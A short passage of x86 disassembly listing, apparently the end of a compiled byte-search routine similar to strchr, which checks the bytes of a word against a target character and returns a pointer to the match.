  4271d9:	ret    
  4271da:	mov    eax,DWORD PTR [edx-0x4]
  4271dd:	cmp    al,bl
  4271df:	je     0x427217
  4271e1:	test   al,al
  4271e3:	je     0x4271d4
  4271e5:	cmp    ah,bl
  4271e7:	je     0x427210
  4271e9:	test   ah,ah
  4271eb:	je     0x4271d4
  4271ed:	shr    eax,0x10
  4271f0:	cmp    al,bl
  4271f2:	je     0x427209
  4271f4:	test   al,al
  4271f6:	je     0x4271d4
  4271f8:	cmp    ah,bl
  4271fa:	je     0x427202
  4271fc:	test   ah,ah
  4271fe:	je     0x4271d4
  427200:	jmp    0x427198
  427202:	pop    esi
  427203:	pop    edi
  427204:	lea    eax,[edx-0x1]
  427207:	pop    ebx
  427208:	ret    
  427209:	lea    eax,[edx-0x2]
  42720c:	pop    esi
  42720d:	pop    edi
  42720e:	pop    ebx
  42720f:	ret    
  427210:	lea    eax,[edx-0x3]
  427213:	pop    esi
  427214:	pop    edi
  427215:	pop    ebx
  427216:	ret    
  427217:	lea    eax,[edx-0x4]
  42721a:	pop    esi
  42721b:	pop    edi
  42721c:	pop    ebx
  42721d:	ret    
  42721e:	jmp    DWORD PTR ds:0x428054
